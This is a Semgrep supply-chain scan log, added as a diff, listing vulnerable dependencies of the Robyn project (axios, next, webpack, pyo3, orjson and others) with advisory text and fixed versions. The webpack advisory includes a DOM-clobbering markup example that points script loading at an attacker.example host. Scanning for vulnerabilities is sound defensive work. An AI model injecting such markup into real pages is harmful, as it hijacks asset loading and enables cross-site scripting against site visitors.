@@ -1,0 +1,1762 @@
+# project: sparckles__Robyn
+# scanner: semgrep-supply-chain
+# time: Fri Jul 10 21:50:05 2026
+$ docker run --rm -e SEMGREP_APP_TOKEN=*** -e SEMGREP_REPO_NAME=sparckles__Robyn -e SEMGREP_GIT_COMMAND_TIMEOUT=1800 -v C:/Users/admin/Documents/Lab Workplace/f-vra/pyshare/data/raw/projects/sparckles__Robyn:/src -v C:/Users/admin/Documents/Lab Workplace/f-vra/pyshare/data/_scans/semgrep-supply-chain:/out -w /src semgrep/semgrep semgrep ci --supply-chain --json-output=/out/sparckles__Robyn.json
+# exit code: 0
+# note: native lock: poetry.lock
+=== STDOUT ===
+                                      
+                                      
+┌────────────────────────────────────┐
+│ 34 Reachable Supply Chain Findings │
+└────────────────────────────────────┘
+              
+    Cargo.lock
+   ❯❯❱ pyo3 - GHSA-36hh-v3qg-5jq4
+          Severity: HIGH                                                                                      
+          Affected versions of pyo3 are vulnerable to Out-of-bounds Read. PyO3 contains flawed implementations
+          of Iterator::nth and DoubleEndedIterator::nth_back for BoundListIterator and BoundTupleIterator.    
+          Target indices are computed with unchecked usize arithmetic before bounds validation and then read  
+          via get_item_unchecked, so a sufficiently large n can overflow (nth) or underflow (nth_back),       
+          causing an out-of-bounds read of previously-yielded elements or of arbitrary memory beyond the      
+          list/tuple storage. Upgrade to pyo3 0.29.0 or later.                                                
+                                                                                                              
+           ▶▶┆ Fixed for pyo3 at version: 0.29.0
+          1292┆ name = "pyo3"
+                              
+    docs_src/package-lock.json
+    ❯❱ @babel/runtime - CVE-2025-27789
+          Severity: MODERATE                                                                                  
+          Affected versions of @babel/helpers, @babel/runtime, @babel/runtime-corejs2, and @babel/runtime-    
+          corejs3 are vulnerable to Inefficient Regular Expression Complexity. Babel generates a polyfill (the
+          `wrapRegExp` helper) for `String.prototype.replace` on regular expressions with named capturing     
+          groups that has quadratic (ReDoS) complexity when an untrusted replacement string containing the    
+          substring `$<` is processed. The vulnerable code is generated polyfill code rather than a symbol you
+          call directly, so any project transpiling named capturing groups against affected browser targets is
+          at risk. Upgrade to a patched version and recompile your code to remediate.                         
+                                                                                                              
+           ▶▶┆ Fixed for @babel/runtime at versions: 7.26.10, 8.0.0-alpha.17
+          240┆ "node_modules/@babel/runtime": {
+            ⋮┆----------------------------------------
+          252┆ "node_modules/@babel/runtime-corejs3": {
+   
+    ❯❱ axios - CVE-2026-40175
+          Severity: MODERATE                                                                                  
+          Affected versions of axios are vulnerable to Improper Neutralization of CRLF Sequences in HTTP      
+          Headers ('HTTP Request/Response Splitting') / Inconsistent Interpretation of HTTP Requests ('HTTP   
+          Request/Response Smuggling') / Server-Side Request Forgery (SSRF). Axios can be used as a gadget for
+          header injection: if another dependency enables prototype pollution, polluted properties can be     
+          merged into Axios request headers and written without CRLF sanitization, allowing request           
+          smuggling/SSRF that can reach internal services such as AWS IMDSv2 and potentially lead to          
+          credential theft or broader compromise.                                                             
+                                                                                                              
+           ▶▶┆ Fixed for axios at versions: 0.31.0, 1.15.0
+          1520┆ "node_modules/axios": {
+   
+   ❯❯❱ axios - CVE-2026-44494
+          Severity: HIGH                                                                                     
+          Affected versions of axios are vulnerable to Improperly Controlled Modification of Object Prototype
+          Attributes ('Prototype Pollution') / Unintended Proxy or Intermediary ('Confused Deputy'). axios   
+          reads `config.proxy` via prototype-chain property access, so any `Object.prototype` pollution      
+          elsewhere in the dependency tree silently routes all HTTP requests through an attacker-controlled  
+          proxy, yielding a full man-in-the-middle. The vulnerability fires on ordinary axios usage with no  
+          specific API call or configuration required; upgrade to axios 1.16.0 or later.                     
+                                                                                                             
+           ▶▶┆ Fixed for axios at version: 1.16.0
+          1520┆ "node_modules/axios": {
+   
+    ❯❱ axios - CVE-2025-62718
+          Severity: MODERATE                                                                                 
+          Affected versions of axios are vulnerable to Server-Side Request Forgery (SSRF) / Unintended Proxy 
+          or Intermediary ('Confused Deputy'). Axios does not normalize hostnames before applying `NO_PROXY`,
+          so requests to loopback or internal hosts such as `localhost.` or `[::1]` can be sent through a    
+          configured proxy instead of bypassing it. If an attacker can influence request URLs, they may force
+          local/internal Axios traffic through an attacker-controlled proxy, undermining SSRF protections and
+          exposing sensitive responses.                                                                      
+                                                                                                             
+           ▶▶┆ Fixed for axios at versions: 0.31.0, 1.15.0
+          1520┆ "node_modules/axios": {
+   
+   ❯❯❱ axios - CVE-2026-44496
+          Severity: HIGH                                                                                     
+          Affected versions of axios are vulnerable to Inefficient Regular Expression Complexity /           
+          Uncontrolled Resource Consumption. axios is vulnerable to a regular expression denial of service   
+          (ReDoS). The internal `cookies.read()` helper in `lib/helpers/cookies.js` builds a regular         
+          expression by concatenating the cookie name directly into the pattern without escaping regex       
+          metacharacters. When the cookie name flowing into the XSRF cookie read (e.g. via `xsrfCookieName`) 
+          contains a catastrophic-backtracking payload, evaluating the regex against `document.cookie` can   
+          freeze the JavaScript event loop, causing a denial of service in the browser tab or in Node.js/SSR 
+          applications. The affected code path is reached during ordinary axios request processing, so any   
+          importer of an affected version is exposed. Upgrade to a patched version (0.32.0 or 1.16.0), or set
+          `xsrfCookieName: null` to disable XSRF cookie reading.                                             
+                                                                                                             
+           ▶▶┆ Fixed for axios at versions: 0.32.0, 1.16.0
+          1520┆ "node_modules/axios": {
+   
+   ❯❯❱ http-cache-semantics - CVE-2022-25881
+          Severity: HIGH                                                                                  
+          http-cache-semantics versions before 4.1.1 are vulnerable to Inefficient Regular Expression     
+          Complexity leading to Denial of Service. The issue can be exploited via malicious request header
+          values sent to a server, when that server reads the cache policy from the request using this    
+          library.                                                                                        
+                                                                                                          
+           ▶▶┆ Fixed for http-cache-semantics at version: 4.1.1
+          4851┆ "node_modules/http-cache-semantics": {
+   
+    ❯❱ js-yaml - CVE-2025-64718
+          Severity: MODERATE                                                                                  
+          Affected versions of js-yaml are vulnerable to Improperly Controlled Modification of Object         
+          Prototype Attributes ('Prototype Pollution'). js-yaml is vulnerable to prototype pollution through  
+          its YAML merge key (`<<`) handling. When parsing untrusted YAML with `load`, `loadAll`, `safeLoad`, 
+          or `safeLoadAll`, a crafted document containing a `__proto__` key inside a merged mapping can modify
+          the prototype of the resulting object, leading to integrity violations in the application.          
+                                                                                                              
+           ▶▶┆ Fixed for js-yaml at versions: 3.14.2, 4.1.1
+          5412┆ "node_modules/js-yaml": {
+   
+    ❯❱ next - CVE-2024-47831
+          Severity: MODERATE                                                                                  
+          Affected versions of next are vulnerable to Uncontrolled Recursion. An attacker can send a crafted  
+          HTTP request to the built-in Next.js image optimization endpoint (`/_next/image`) with a URL-encoded
+          or absolute self-referential `url` parameter that bypasses the recursion guard, causing the server  
+          to recursively optimize images until CPU is exhausted, resulting in a Denial of Service.            
+                                                                                                              
+           ▶▶┆ Fixed for next at version: 14.2.7
+          7496┆ "node_modules/next": {
+   
+   ❯❯❱ next - GHSA-8h8q-6873-q5fj
+          Severity: HIGH                                                                                      
+          Affected versions of next are vulnerable to Allocation of Resources Without Limits or Throttling. An
+          attacker can send a specially crafted HTTP request to any Next.js App Router Server Function        
+          endpoint that, when deserialized by the underlying React Server Components (Flight) runtime,        
+          triggers excessive CPU usage—exhausting the server process and resulting in a denial-of-service. The
+          vulnerable deserialization path is part of the App Router's HTTP route handler, so any Next.js      
+          application that uses the App Router is reachable without any explicit Server Action declared in    
+          user code.                                                                                          
+                                                                                                              
+           ▶▶┆ Fixed for next at versions: 15.5.16, 16.2.5
+          7496┆ "node_modules/next": {
+   
+    ❯❱ next - CVE-2025-55173
+          Severity: MODERATE                                                                                  
+          Affected versions of next are vulnerable to Improper Input Validation. Next.js Image Optimization   
+          (`/_next/image`) is affected by two related vulnerabilities fixed together. First, regardless of    
+          configuration, the image optimizer forwarded all inbound request headers — including cookies and    
+          authentication tokens — to internal API routes when proxying relative image URLs (e.g.              
+          `/_next/image? url=/api/private-endpoint`), allowing an attacker to make authenticated requests to  
+          internal endpoints through the public image optimizer. Second, if `images.domains` or               
+          `images.remotePatterns` is configured, an attacker who controls an allowed external image server can
+          serve non-image content that bypasses magic-number content-type detection; Next.js falls back to the
+          upstream `Content-Type` header and serves the arbitrary payload as a file download under the trusted
+          application domain — enabling phishing, drive-by downloads, or malicious file delivery.             
+                                                                                                              
+           ▶▶┆ Fixed for next at versions: 14.2.31, 15.4.5
+          7496┆ "node_modules/next": {
+   
+   ❯❯❱ next - CVE-2024-39693
+          Severity: HIGH                                                                
+          Affected versions of next are vulnerable to Uncontrolled Resource Consumption.
+                                                                                        
+           ▶▶┆ Fixed for next at version: 13.5.0
+          7496┆ "node_modules/next": {
+   
+    ❯❱ next - CVE-2024-56332
+          Severity: MODERATE                                                                                  
+          Affected versions of next are vulnerable to Allocation of Resources Without Limits or Throttling. An
+          attacker can send a Server Action request with an abruptly closed connection or invalid Content-    
+          Length header, causing the internal React Flight Reply decoder to create perpetually-pending promise
+          chunks that never resolve. This leaves the server connection hanging indefinitely until the hosting 
+          provider times out execution, resulting in a denial of service.                                     
+                                                                                                              
+           ▶▶┆ Fixed for next at versions: 13.5.8, 14.2.21, 15.1.2
+          7496┆ "node_modules/next": {
+   
+   ❯❯❱ next - GHSA-q4gf-8mx6-v5v3
+          Severity: HIGH                                                                                     
+          Affected versions of next are vulnerable to Allocation of Resources Without Limits or Throttling. A
+          specially crafted HTTP request to a Next.js App Router Server Function endpoint can trigger        
+          excessive CPU consumption during React Server Components deserialization, leading to denial of     
+          service.                                                                                           
+                                                                                                             
+           ▶▶┆ Fixed for next at versions: 15.5.15, 16.2.3
+          7496┆ "node_modules/next": {
+   
+   ❯❯❱ next - GHSA-mwv6-3258-q52c
+          Severity: HIGH                                                                                      
+          Affected versions of next are vulnerable to Dependency on Vulnerable Third-Party Component /        
+          Deserialization of Untrusted Data / Uncontrolled Resource Consumption. A flaw in Next.js's App      
+          Router deserialization allows an attacker to send a specially crafted HTTP request body that, when  
+          parsed by the server, triggers excessive CPU work or an infinite loop. By targeting any App Router  
+          endpoint with this malicious payload, the server process can hang and become unresponsive, resulting
+          in a denial-of-service.                                                                             
+                                                                                                              
+           ▶▶┆ Fixed for next at versions: 14.2.34, 15.0.6, 15.1.10, 15.2.7, 15.3.7, 15.4.9, 15.5.8, 15.6.0-canary.59,  
+  16.0.9, 16.1.0-canary.17                                                                                              
+          7496┆ "node_modules/next": {
+   
+   ❯❯❱ next - GHSA-5j59-xgg2-r9c4
+          Severity: HIGH                                                                                     
+          Affected versions of next are vulnerable to Dependency on Vulnerable Third-Party Component /       
+          Deserialization of Untrusted Data / Uncontrolled Resource Consumption. An attacker can send a      
+          specially crafted HTTP request to any Server Function endpoint (as used by Next.js' App Router)    
+          that, when deserialized by the React Server Components runtime, enters an infinite loop—hanging the
+          server process, exhausting CPU, and resulting in a denial-of-service.                              
+                                                                                                             
+           ▶▶┆ Fixed for next at versions: 14.2.35, 15.0.7, 15.1.11, 15.2.8, 15.3.8, 15.4.10, 15.5.9, 15.6.0-canary.60, 
+  16.0.10, 16.1.0-canary.19                                                                                             
+          7496┆ "node_modules/next": {
+   
+   ❯❯❱ next - GHSA-h25m-26qc-wcjf
+          Severity: HIGH                                                                                     
+          Affected versions of next are vulnerable to Deserialization of Untrusted Data / Uncontrolled       
+          Resource Consumption. A flaw in React Server Components' deserialization allows an attacker to send
+          a specially crafted HTTP request to any App Router Server Function endpoint in Next.js, triggering 
+          excessive CPU usage, out-of-memory conditions, or a server crash and resulting in a denial of      
+          service.                                                                                           
+                                                                                                             
+           ▶▶┆ Fixed for next at versions: 15.0.8, 15.1.12, 15.2.9, 15.3.9, 15.4.11, 15.5.10, 15.6.0-canary.61, 16.0.11,
+  16.1.5                                                                                                                
+          7496┆ "node_modules/next": {
+   
+    ❯❱ webpack - CVE-2024-43788
+          Severity: MODERATE                                                                                
+          Affected versions of webpack are vulnerable to Improper Neutralization of Input During Web Page   
+          Generation ('Cross-site Scripting'). webpack's AutoPublicPathRuntimeModule emits runtime code that
+          derives the asset public path from document.currentScript. Because document.currentScript can be  
+          DOM-clobbered by an injected scriptless element (e.g. <img name="currentScript"                   
+          src="https://attacker.example/">), an attacker who can inject markup into the page can redirect   
+          dynamic chunk/asset loading to an attacker-controlled origin, resulting in cross-site scripting   
+          (XSS).                                                                                            
+                                                                                                            
+           ▶▶┆ Fixed for webpack at version: 5.94.0
+          12487┆ "node_modules/webpack": {
+                                                                               
+    docs_src/src/components/Header.jsx with lockfile docs_src/package-lock.json
+    ❯❱ next - CVE-2025-57752
+          Severity: MODERATE                                                                                 
+          Affected versions of next are vulnerable to Use of Cache Containing Sensitive Information. The     
+          Next.js Image Optimization endpoint forwarded the original HTTP request headers (including Cookie  
+          and Authorization) to internal API routes when fetching images, but those headers were not included
+          in the cache key. This allows auth-gated or user-specific image responses to be cached under a     
+          shared key and served to unauthenticated or differently-authenticated users.                       
+                                                                                                             
+           ▶▶┆ Fixed for next at versions: 14.2.31, 15.4.5
+          211┆ <Image
+          212┆   src={robynLogo}
+          213┆   alt="Robyn Framework logo"
+          214┆   sizes={large ? '4rem' : '2.25rem'}
+          215┆   className={clsx(
+          216┆     'rounded-md bg-zinc-800 object-cover',
+          217┆     large ? 'h-16 w-16' : 'h-9 w-9'
+          218┆   )}
+          219┆   priority
+          220┆ />
+                                                                                                
+    docs_src/src/components/documentation/Libraries.jsx with lockfile docs_src/package-lock.json
+    ❯❱ next - CVE-2025-57752
+          Severity: MODERATE                                                                                 
+          Affected versions of next are vulnerable to Use of Cache Containing Sensitive Information. The     
+          Next.js Image Optimization endpoint forwarded the original HTTP request headers (including Cookie  
+          and Authorization) to internal API routes when fetching images, but those headers were not included
+          in the cache key. This allows auth-gated or user-specific image responses to be cached under a     
+          shared key and served to unauthenticated or differently-authenticated users.                       
+                                                                                                             
+           ▶▶┆ Fixed for next at versions: 14.2.31, 15.4.5
+           61┆ <Image
+           62┆   src={library.logo}
+           63┆   alt=""
+           64┆   className="h-12 w-12"
+           65┆   unoptimized
+           66┆ />
+                                                                             
+    docs_src/src/pages/community.jsx with lockfile docs_src/package-lock.json
+    ❯❱ next - CVE-2025-57752
+          Severity: MODERATE                                                                                 
+          Affected versions of next are vulnerable to Use of Cache Containing Sensitive Information. The     
+          Next.js Image Optimization endpoint forwarded the original HTTP request headers (including Cookie  
+          and Authorization) to internal API routes when fetching images, but those headers were not included
+          in the cache key. This allows auth-gated or user-specific image responses to be cached under a     
+          shared key and served to unauthenticated or differently-authenticated users.                       
+                                                                                                             
+           ▶▶┆ Fixed for next at versions: 14.2.31, 15.4.5
+          123┆ <Image
+          124┆   className="h-96 w-full flex-none rounded-2xl object-cover shadow-xl  lg:aspect-square
+               lg:h-auto lg:max-w-sm"                                                                 
+          125┆   src={sparcklesLogo}
+          126┆   alt="Sparckles open-source organization logo"
+          127┆ />
+                                                                                  
+    docs_src/src/pages/releases/index.jsx with lockfile docs_src/package-lock.json
+   ❯❯❱ axios - CVE-2026-42033
+          Severity: HIGH                                                                                     
+          Affected versions of axios are vulnerable to Improperly Controlled Modification of Object Prototype
+          Attributes ('Prototype Pollution'). Axios do not guard reads of config properties (e.g.            
+          `parseReviver`, `transport`, `transformRequest`, `transformResponse`) with `hasOwnProperty` checks.
+          If `Object.prototype` is polluted by any co-dependency in the same Node.js process, an attacker can
+          install gadgets that silently tamper with and exfiltrate JSON response bodies, or fully hijack the 
+          underlying HTTP transport to capture request URLs, headers, and basic-auth credentials.            
+                                                                                                             
+           ▶▶┆ Fixed for axios at versions: 0.31.1, 1.15.1
+           56┆ const response = await axios.get(
+           57┆   'https://api.github.com/repos/sparckles/robyn/releases'
+           58┆ )
+   
+   ❯❯❱ axios - CVE-2026-42264
+          Severity: HIGH                                                                                     
+          Affected versions of axios are vulnerable to Improperly Controlled Modification of Object Prototype
+          Attributes ('Prototype Pollution'). An attacker can exploit this vulnerability by polluting        
+          Object.prototype via another dependency in the same Node.js process. Axios reads five HTTP adapter 
+          config properties (auth, baseURL, socketPath, beforeRedirect, insecureHTTPParser) via direct       
+          property access without hasOwnProperty guards, so the polluted values are silently picked up on    
+          every outbound HTTP request. This enables Authorization header credential injection, request       
+          hijacking via baseURL redirection, SSRF to internal Unix sockets, attacker-controlled callback     
+          execution during redirects, and request smuggling via the insecure HTTP parser.                    
+                                                                                                             
+           ▶▶┆ Fixed for axios at version: 1.15.2
+           56┆ const response = await axios.get(
+           57┆   'https://api.github.com/repos/sparckles/robyn/releases'
+           58┆ )
+   
+   ❯❯❱ axios - CVE-2026-42043
+          Severity: HIGH                                                                                      
+          Affected versions of axios are vulnerable to Permissive List of Allowed Inputs / Server-Side Request
+          Forgery (SSRF) / Unintended Proxy or Intermediary ('Confused Deputy'). Axios contains an incomplete 
+          fix for CVE-2025-62718. The internal `isLoopback()` helper in `lib/helpers/shouldBypassProxy.js`    
+          recognizes only `127.0.0.1`, `localhost`, and `::1` as loopback addresses, instead of the entire    
+          `127.0.0.0/8` subnet defined by RFC 1122 §3.2.1.3. Any Node-side Axios request whose target host    
+          falls in `127.0.0.0/8` but is not literally `127.0.0.1` (e.g., `127.0.0.2`, `127.1.2.3`) is silently
+          routed through the configured `HTTP_PROXY`/`HTTPS_PROXY` even when `NO_PROXY` is set to exempt      
+          loopback. This enables SSRF, exposes internal/loopback-bound services (e.g., sidecars, metrics      
+          agents, vault helpers listening on `127.0.0.X`), and may leak request headers, credentials, and     
+          bodies to a proxy intermediary.                                                                     
+                                                                                                              
+           ▶▶┆ Fixed for axios at versions: 0.31.1, 1.15.1
+           56┆ const response = await axios.get(
+           57┆   'https://api.github.com/repos/sparckles/robyn/releases'
+           58┆ )
+   
+   ❯❯❱ axios - CVE-2026-25639
+          Severity: HIGH                                                                                      
+          Affected versions of axios are vulnerable to Improper Check for Unusual or Exceptional Conditions / 
+          Improperly Controlled Modification of Object Prototype Attributes ('Prototype Pollution'). It fails 
+          to correctly validate configuration keys during merging. This allows a crafted __proto__ property to
+          trigger an internal TypeError, causing the application to crash.                                    
+                                                                                                              
+           ▶▶┆ Fixed for axios at versions: 0.30.3, 1.13.5
+           56┆ const response = await axios.get(
+           57┆   'https://api.github.com/repos/sparckles/robyn/releases'
+           58┆ )
+   
+   ❯❯❱ axios - CVE-2026-44487
+          Severity: HIGH                                                                                     
+          Affected versions of axios are vulnerable to Insertion of Sensitive Information Into Sent Data. The
+          Node.js HTTP adapter in axios fails to clear the Proxy-Authorization header when a request that    
+          initially used an authenticated HTTP proxy is redirected to a target requiring no proxy (e.g. an   
+          HTTP-to-HTTPS redirect with no HTTPS proxy configured), leaking the proxy credentials to the final 
+          origin server.                                                                                     
+                                                                                                             
+           ▶▶┆ Fixed for axios at versions: 0.32.0, 1.16.0
+           56┆ const response = await axios.get(
+           57┆   'https://api.github.com/repos/sparckles/robyn/releases'
+           58┆ )
+   
+   ❯❯❱ axios - CVE-2026-44494
+          Severity: HIGH                                                                                     
+          Affected versions of axios are vulnerable to Improperly Controlled Modification of Object Prototype
+          Attributes ('Prototype Pollution') / Unintended Proxy or Intermediary ('Confused Deputy'). axios   
+          reads `config.proxy` via prototype-chain property access, so any `Object.prototype` pollution      
+          elsewhere in the dependency tree silently routes all HTTP requests through an attacker-controlled  
+          proxy, yielding a full man-in-the-middle. The vulnerability fires on ordinary axios usage with no  
+          specific API call or configuration required; upgrade to axios 1.16.0 or later.                     
+                                                                                                             
+           ▶▶┆ Fixed for axios at version: 1.16.0
+           56┆ const response = await axios.get(
+           57┆   'https://api.github.com/repos/sparckles/robyn/releases'
+           58┆ )
+   
+   ❯❯❱ axios - CVE-2026-44495
+          Severity: HIGH                                                                                     
+          Affected versions of axios are vulnerable to Improper Control of Generation of Code ('Code         
+          Injection') / Improperly Controlled Modification of Object Prototype Attributes ('Prototype        
+          Pollution'). axios contains a prototype-pollution gadget in its config merge pipeline. If          
+          Object.prototype.transformResponse is polluted by a separate vulnerability in the same process,    
+          mergeConfig() reads it through the prototype chain and transformData() executes the inherited      
+          function on every HTTP response body, enabling credential theft and response hijacking. Every axios
+          HTTP call traverses this pipeline. Upgrade to 0.31.1, 1.15.2, or later.                            
+                                                                                                             
+           ▶▶┆ Fixed for axios at versions: 0.31.1, 1.15.2
+           56┆ const response = await axios.get(
+           57┆   'https://api.github.com/repos/sparckles/robyn/releases'
+           58┆ )
+   
+   ❯❯❱ axios - CVE-2026-44486
+          Severity: HIGH                                                                                     
+          Affected versions of axios are vulnerable to Exposure of Sensitive Information to an Unauthorized  
+          Actor. The Node.js HTTP adapter in axios leaks authenticated proxy credentials when following      
+          redirects. When a request traverses an authenticated proxy and is then redirected to a URL that no 
+          longer routes through that proxy, the stale `Proxy-Authorization` header persists on the redirected
+          request and is exposed to the (potentially attacker-controlled) redirect target, disclosing the    
+          proxy username and password. Upgrade to axios >= 1.16.0 or >= 0.32.0.                              
+                                                                                                             
+           ▶▶┆ Fixed for axios at versions: 0.32.0, 1.16.0
+           56┆ const response = await axios.get(
+           57┆   'https://api.github.com/repos/sparckles/robyn/releases'
+           58┆ )
+               
+    poetry.lock
+   ❯❯❱ black - CVE-2026-32274
+          Severity: HIGH                                                                                     
+          Affected versions of black are vulnerable to Improper Limitation of a Pathname to a Restricted     
+          Directory ('Path Traversal'). Black's cache filename construction embeds the `--python-cell-magics`
+          option value without sanitization, allowing an attacker who can control this argument to perform a 
+          path traversal and write Black cache files to arbitrary filesystem locations.                      
+                                                                                                             
+           ▶▶┆ Fixed for black at version: 26.3.1
+           20┆ name = "black"
+                                              
+    robyn/jsonify.py with lockfile poetry.lock
+   ❯❯❱ orjson - CVE-2025-67221
+          Severity: HIGH                                                                                      
+          Affected versions of orjson are vulnerable to Allocation of Resources Without Limits or Throttling. 
+          `orjson.dumps` does not enforce a recursion/depth limit when serializing deeply nested Python/JSON- 
+          like structures, allowing an attacker to supply or trigger extremely deep nesting that can cause    
+          unbounded recursion and crash the process (stack overflow / denial of service) during serialization.
+                                                                                                              
+           ▶▶┆ Fixed for orjson at version: 3.11.6
+           13┆ output_binary = orjson.dumps(data)
+                                                       
+    robyn/pydantic_support.py with lockfile poetry.lock
+   ❯❯❱ orjson - CVE-2025-67221
+          Severity: HIGH                                                                                      
+          Affected versions of orjson are vulnerable to Allocation of Resources Without Limits or Throttling. 
+          `orjson.dumps` does not enforce a recursion/depth limit when serializing deeply nested Python/JSON- 
+          like structures, allowing an attacker to supply or trigger extremely deep nesting that can cause    
+          unbounded recursion and crash the process (stack overflow / denial of service) during serialization.
+                                                                                                              
+           ▶▶┆ Fixed for orjson at version: 3.11.6
+          175┆ return orjson.dumps([item.model_dump(mode="python") for item in res]).decode("utf-8")
+                                         
+    robyn/ws.py with lockfile poetry.lock
+   ❯❯❱ orjson - CVE-2025-67221
+          Severity: HIGH                                                                                      
+          Affected versions of orjson are vulnerable to Allocation of Resources Without Limits or Throttling. 
+          `orjson.dumps` does not enforce a recursion/depth limit when serializing deeply nested Python/JSON- 
+          like structures, allowing an attacker to supply or trigger extremely deep nesting that can cause    
+          unbounded recursion and crash the process (stack overflow / denial of service) during serialization.
+                                                                                                              
+           ▶▶┆ Fixed for orjson at version: 3.11.6
+           74┆ await self.send_text(orjson.dumps(data).decode())
+                                         
+                                         
+┌───────────────────────────────────────┐
+│ 62 Undetermined Supply Chain Findings │
+└───────────────────────────────────────┘
+              
+    Cargo.lock
+    ❯❱ actix-files - GHSA-gcqf-3g44-vc9p
+          Severity: MODERATE                                                           
+          Affected versions of actix-files are vulnerable to Improper Input Validation.
+                                                                                       
+           ▶▶┆ Fixed for actix-files at version: 0.6.10
+           48┆ name = "actix-files"
+   
+    ❯❱ actix-files - GHSA-8v2v-wjwg-vx6r
+          Severity: MODERATE                                                                        
+          Affected versions of actix-files are vulnerable to Exposure of Sensitive Information to an
+          Unauthorized Actor.                                                                       
+                                                                                                    
+           ▶▶┆ Fixed for actix-files at version: 0.6.10
+           48┆ name = "actix-files"
+   
+    ❯❱ actix-http - GHSA-xhj4-vrgc-hr34
+          Severity: MODERATE                                                                            
+          Affected versions of actix-http are vulnerable to Inconsistent Interpretation of HTTP Requests
+          ('HTTP Request/Response Smuggling').                                                          
+                                                                                                        
+           ▶▶┆ Fixed for actix-http at version: 3.12.1
+           71┆ name = "actix-http"
+   
+    ❯❱ bytes - CVE-2026-25541
+          Severity: MODERATE                                                               
+          Affected versions of bytes are vulnerable to Integer Overflow to Buffer Overflow.
+                                                                                           
+           ▶▶┆ Fixed for bytes at version: 1.11.1
+          433┆ name = "bytes"
+   
+    ❯❱ pyo3 - GHSA-chgr-c6px-7xpp
+          Severity: MODERATE                                                                                  
+          Affected versions of pyo3 are vulnerable to Concurrent Execution using Shared Resource with Improper
+          Synchronization ('Race Condition').                                                                 
+                                                                                                              
+           ▶▶┆ Fixed for pyo3 at version: 0.29.0
+          1292┆ name = "pyo3"
+   
+     ❱ rand - GHSA-cq8v-f236-94qc
+          Severity: LOW                                                         
+          Affected versions of rand are vulnerable to Improper Input Validation.
+                                                                                
+           ▶▶┆ Fixed for rand at versions: 0.10.1, 0.8.6, 0.9.3
+          1413┆ name = "rand"
+            ⋮┆----------------------------------------
+          1413┆ name = "rand"
+   
+    ❯❱ time - CVE-2026-25727
+          Severity: MODERATE                                                      
+          Affected versions of time are vulnerable to Stack-based Buffer Overflow.
+                                                                                  
+           ▶▶┆ Fixed for time at version: 0.3.47
+          1766┆ name = "time"
+                              
+    docs_src/package-lock.json
+    ❯❱ ajv - CVE-2025-69873
+          Severity: MODERATE                                                                                 
+          Affected versions of ajv are vulnerable to Inefficient Regular Expression Complexity / Uncontrolled
+          Resource Consumption.                                                                              
+                                                                                                             
+           ▶▶┆ Fixed for ajv at versions: 6.14.0, 8.18.0
+          1250┆ "node_modules/ajv": {
+   
+    ❯❱ axios - CVE-2026-42038
+          Severity: MODERATE                                                              
+          Affected versions of axios are vulnerable to Server-Side Request Forgery (SSRF).
+                                                                                          
+           ▶▶┆ Fixed for axios at versions: 0.31.1, 1.15.1
+          1520┆ "node_modules/axios": {
+   
+    ❯❱ axios - CVE-2026-42044
+          Severity: MODERATE                                                                              
+          Affected versions of axios are vulnerable to Improperly Controlled Modification of Dynamically- 
+          Determined Object Attributes / Improperly Controlled Modification of Object Prototype Attributes
+          ('Prototype Pollution').                                                                        
+                                                                                                          
+           ▶▶┆ Fixed for axios at version: 1.15.2
+          1520┆ "node_modules/axios": {
+   
+    ❯❱ axios - CVE-2026-42036
+          Severity: MODERATE                                                                                
+          Affected versions of axios are vulnerable to Allocation of Resources Without Limits or Throttling.
+                                                                                                            
+           ▶▶┆ Fixed for axios at versions: 0.31.1, 1.15.1
+          1520┆ "node_modules/axios": {
+   
+    ❯❱ axios - CVE-2026-42039
+          Severity: MODERATE                                                  
+          Affected versions of axios are vulnerable to Uncontrolled Recursion.
+                                                                              
+           ▶▶┆ Fixed for axios at versions: 0.31.1, 1.15.1
+          1520┆ "node_modules/axios": {
+   
+    ❯❱ axios - CVE-2026-42042
+          Severity: MODERATE                                                                              
+          Affected versions of axios are vulnerable to Insertion of Sensitive Information Into Sent Data /
+          Permissive List of Allowed Inputs.                                                              
+                                                                                                          
+           ▶▶┆ Fixed for axios at versions: 0.31.1, 1.15.1
+          1520┆ "node_modules/axios": {
+   
+    ❯❱ axios - CVE-2026-42041
+          Severity: MODERATE                                                                          
+          Affected versions of axios are vulnerable to Improper Authentication / Improperly Controlled
+          Modification of Object Prototype Attributes ('Prototype Pollution').                        
+                                                                                                      
+           ▶▶┆ Fixed for axios at versions: 0.31.1, 1.15.1
+          1520┆ "node_modules/axios": {
+   
+     ❱ axios - CVE-2026-42040
+          Severity: LOW                                                                                   
+          Affected versions of axios are vulnerable to Improper Encoding or Escaping of Output / Null Byte
+          Interaction Error (Poison Null Byte).                                                           
+                                                                                                          
+           ▶▶┆ Fixed for axios at versions: 0.31.1, 1.15.1
+          1520┆ "node_modules/axios": {
+   
+    ❯❱ axios - CVE-2026-42034
+          Severity: MODERATE                                                                                
+          Affected versions of axios are vulnerable to Allocation of Resources Without Limits or Throttling.
+                                                                                                            
+           ▶▶┆ Fixed for axios at versions: 0.31.1, 1.15.1
+          1520┆ "node_modules/axios": {
+   
+    ❯❱ axios - CVE-2026-42037
+          Severity: MODERATE                                                                           
+          Affected versions of axios are vulnerable to Improper Neutralization of CRLF Sequences ('CRLF
+          Injection').                                                                                 
+                                                                                                       
+           ▶▶┆ Fixed for axios at version: 1.15.1
+          1520┆ "node_modules/axios": {
+   
+    ❯❱ axios - CVE-2026-44490
+          Severity: MODERATE                                                                                 
+          Affected versions of axios are vulnerable to Improperly Controlled Modification of Object Prototype
+          Attributes ('Prototype Pollution').                                                                
+                                                                                                             
+           ▶▶┆ Fixed for axios at versions: 0.32.0, 1.16.0
+          1520┆ "node_modules/axios": {
+   
+    ❯❱ brace-expansion - CVE-2026-33750
+          Severity: MODERATE                                                                       
+          Affected versions of brace-expansion are vulnerable to Uncontrolled Resource Consumption.
+                                                                                                   
+           ▶▶┆ Fixed for brace-expansion at versions: 1.1.13, 2.0.3, 3.0.2, 5.0.5
+          1677┆ "node_modules/brace-expansion": {
+   
+     ❱ brace-expansion - CVE-2025-5889
+          Severity: LOW                                                                            
+          Affected versions of brace-expansion are vulnerable to Uncontrolled Resource Consumption.
+                                                                                                   
+           ▶▶┆ Fixed for brace-expansion at versions: 1.1.12, 2.0.2, 3.0.1, 4.0.1
+          1677┆ "node_modules/brace-expansion": {
+   
+     ❱ diff - CVE-2026-24001
+          Severity: LOW                                                                                       
+          Affected versions of diff are vulnerable to Inefficient Regular Expression Complexity / Uncontrolled
+          Resource Consumption.                                                                               
+                                                                                                              
+           ▶▶┆ Fixed for diff at versions: 3.5.1, 4.0.4, 5.2.2, 8.0.3
+          2364┆ "node_modules/diff": {
+   
